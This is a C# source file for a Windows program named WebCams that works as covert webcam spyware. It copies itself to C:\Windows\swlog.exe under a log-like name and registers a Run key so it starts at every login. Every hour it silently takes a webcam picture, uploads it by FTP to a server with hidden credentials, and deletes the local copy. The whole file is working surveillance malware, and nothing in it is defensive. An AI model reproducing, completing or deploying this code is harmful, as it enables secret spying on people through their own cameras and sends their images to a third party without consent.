using System;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace WebCams
{
    class Program
    {
        private const int WM_CAP_DRIVER_CONNECT = 0x40a;
        private const int WM_CAP_DRIVER_DISCONNECT = 0x40b;
        private const int WS_CHILD = 0x40000000;
        private const int WS_POPUP = unchecked((int)0x80000000);
        private const int WM_CAP_SAVEDIB = 0x419;


        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
        public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);
        [DllImport("user32", EntryPoint = "SendMessage")]
        public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

        static void Main(string[] args)
        {
            string dir = "C:\\Windows\\swlog.exe";
            string path = Environment.GetEnvironmentVariable("USERPROFILE") + "\\Pictures\\" + DateTime.Now.ToString("yyyy.MM.dd HH.mm.ss") + ".jpg";
            string server = "####";
            string login = "####";
            string pass = "####";
            while (true)
            {
                try
                {
                    File.Copy(Application.ExecutablePath, dir);
                    var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", true);
                    key.SetValue("swlog", dir);
                }
                catch (IOException copyError)
                {
                    String dName = "".PadRight(100);
                    String dVersion = "".PadRight(100);
                    IntPtr hWndC = capCreateCaptureWindowA("VFW Capture", WS_POPUP | WS_CHILD, 0, 0, 320, 240, 0, 0);
                    SendMessage(hWndC, WM_CAP_DRIVER_CONNECT, 0, 0);
                    IntPtr hBmp = Marshal.StringToHGlobalAnsi(path);
                    SendMessage(hWndC, WM_CAP_SAVEDIB, 0, hBmp.ToInt32());
                    SendMessage(hWndC, WM_CAP_DRIVER_DISCONNECT, 0, 0);
                    FileInfo fileInf = new FileInfo(path);
                    FtpWebRequest reqFTP;
                    reqFTP = (FtpWebRequest)FtpWebRequest.Create(new Uri("ftp://" + server + "/" + fileInf.Name));
                    reqFTP.Credentials = new NetworkCredential(login, pass);
                    reqFTP.KeepAlive = false;
                    reqFTP.Method = WebRequestMethods.Ftp.UploadFile;
                    reqFTP.UseBinary = true;
                    reqFTP.ContentLength = fileInf.Length;
                    int buffLength = 2048;
                    byte[] buff = new byte[buffLength];
                    int contentLen;
                    FileStream fs = fileInf.OpenRead();
                    try
                    {
                        Stream strm = reqFTP.GetRequestStream();
                        contentLen = fs.Read(buff, 0, buffLength);
                        while (contentLen != 0)
                        {
                            strm.Write(buff, 0, contentLen);
                            contentLen = fs.Read(buff, 0, buffLength);
                        }
                        strm.Close();
                        fs.Close();
                        File.Delete(path);
                    }
                    catch (Exception ex)
                    {
                        fs.Close();
                        File.Delete(path);
                    }

                }
                System.Threading.Thread.Sleep(3600000);
            }
        }
    } 
}
